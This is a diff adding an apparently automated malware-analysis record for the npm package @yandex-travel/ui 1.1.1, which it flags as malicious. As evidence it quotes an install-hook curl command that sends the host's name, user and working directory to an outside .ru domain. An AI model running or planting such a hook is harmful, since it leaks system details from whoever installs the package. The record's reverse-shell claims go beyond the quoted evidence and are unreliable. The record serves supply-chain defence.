@@ -1,0 +1,54 @@
+{
+  "package_name": "@yandex-travel/ui",
+  "version": "1.1.1",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that executes at install time with commands listed in the package metadata.",
+        "details": "The install hook is present and executes at install time with the commands listed in the package metadata. The commands are likely used to deliver a malicious payload.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@yandex-travel/ui\" -H \"Version:1.1.1\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object represents the analysis of the package @yandex-travel/ui version 1.1.1. The behavior identified is of category \"install_hook\". The summary states that the package contains an install hook that executes at install time with commands listed in the package metadata. The details provide more information about the behavior, stating that the install hook is present and executes at install time with the commands listed in the package metadata. The confidence score is 0.92, indicating high confidence in the detection of this behavior. The evidence_commands field provides the commands that were executed, which are used to deliver a malicious payload. The risk_vector field indicates that the identified behavior is of category \"install_hook\"."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.92
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not have a description or README file."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:06:16.251497"
+}
